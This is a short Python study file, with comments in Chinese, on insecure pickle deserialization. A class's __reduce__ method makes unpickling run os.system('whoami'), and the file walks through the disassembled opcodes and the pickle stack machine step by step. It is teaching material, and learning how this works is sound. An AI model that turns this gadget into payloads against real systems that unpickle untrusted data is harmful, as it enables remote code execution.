import pickle

class Expliot:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))
    
serialized = (pickle.dumps(Expliot()))

import pickletools

pickletools.dis(
    pickletools.optimize(serialized)
)

#     0: \x80 PROTO      4
#     2: \x95 FRAME      27
#    11: \x8c SHORT_BINUNICODE 'posix'
#    18: \x8c SHORT_BINUNICODE 'system'
#    26: \x93 STACK_GLOBAL
#    27: \x8c SHORT_BINUNICODE 'whoami'
#    35: \x85 TUPLE1
#    36: R    REDUCE
#    37: .    STOP
# highest protocol among opcodes = 4

# pickle 為一個基於stack 的virtual machine, 裡面有兩個東西 : Memo, Stack
# Memo : {}
# Stack : [], 模擬stack 行為
# 11 : ['posix']
# 18 : ['posix', 'system']
# 26 : [<fn system>] # 先將system, posix pop出來後, <from posix import system> push進去
# 27 : [<fn system>, 'whoami']
# 35 : [<fn system>, ('whoami',)]

# 36 : REDUCE : 將stack 最上面的兩個東西pop 出來, 並將第二個東西當作第一個東西的參數, 並將結果push 回去
# arg = stack.pop()
# func = stack.pop()
# stack.push(func(arg))
# ['robert']

# 37 : return stack.pop()

# pickle 主要功能
# 1. 創建string, tuples 等等 : 'str', 123, (1,2,3)
# 2. import module : import os
# 3. call function : os.system('whoami')
# 4. set attribute : os.system = <function system at 0x7f9b1c2b0d30>
# 5. set index : os[0] = 'a'